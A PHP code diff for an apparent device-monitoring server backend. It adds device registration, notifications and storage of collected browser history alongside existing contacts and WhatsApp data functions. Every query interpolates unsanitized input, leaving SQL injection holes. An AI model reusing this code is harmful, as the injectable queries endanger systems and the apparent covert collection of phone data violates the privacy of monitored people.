@@ -6,12 +6,21 @@ if($conn->connect_error)
 
 function add_device($msg,$socket){
   require("connect.php");
+  $text="New Device Registered with Model $msg->devname ";
+  if(!isset($msg->devuser)){
+      $query="INSERT INTO devices(user_name,device_id,device_name,device_api,cameras,last_seen) values('$msg->user','$msg->id','$msg->devname','$msg->api',$msg->cameras,'".time()."')";
+      $text.=" with no primary account.";
+  }else{
+      $query="INSERT INTO devices(user_name,device_id,device_name,device_account,device_api,cameras,last_seen) values('$msg->user','$msg->id','$msg->devname','$msg->devuser','$msg->api',$msg->cameras,'".time()."')";
+      $text.=" with primary account $msg->devuser.";
+  }
 
-  $query="INSERT INTO devices(user_name,device_id,device_name,device_account,device_api,cameras,last_seen) values('$msg->user','$msg->id','$msg->devname','$msg->devuser','$msg->api',$msg->cameras,'".time()."')";
   if(! $conn->query($query)){
     echo "device error:".mysqli_error($conn);
+    add_notification($msg->user,$msg->id,"dev","$msg->devname came online");
   }else{
     echo "new device added";
+    add_notification($msg->user,$msg->id,"dev",$text);
     return 1;
   }
   $query="INSERT INTO active values('".$msg->id."','".$socket."','$msg->connection')";
@@ -115,6 +124,16 @@ function update_contacts($dev,$fname){
   }
 }
 
+function update_browserhistory($dev,$fname){
+  require("connect.php");
+  $query="UPDATE devices set saved_history='$fname' where device_id='$dev'";
+  if(!$conn->query($query)){
+    echo "error".mysqli_error($conn);
+  }else{
+    //echo "image added";
+  }
+}
+
 function update_whatsapp($dev,$fname){
   require("connect.php");
   $query="UPDATE devices set saved_whatsapp='$fname' where device_id='$dev'";
@@ -164,5 +183,15 @@ function truncate(){
   }
 }
 
+function add_notification($user,$sender,$type,$text){
+  require("connect.php");
+  $query="INSERT INTO notification(user_name,device_id,type,text,time) values('$user','$sender','$type','$text','".time()."')";
+  if(! $conn->query($query)){
+    echo "notification error:".mysqli_error($conn);
+  }else{
+    echo "new $type notification added";
+    return 1;
+  }
+}
 
  ?>
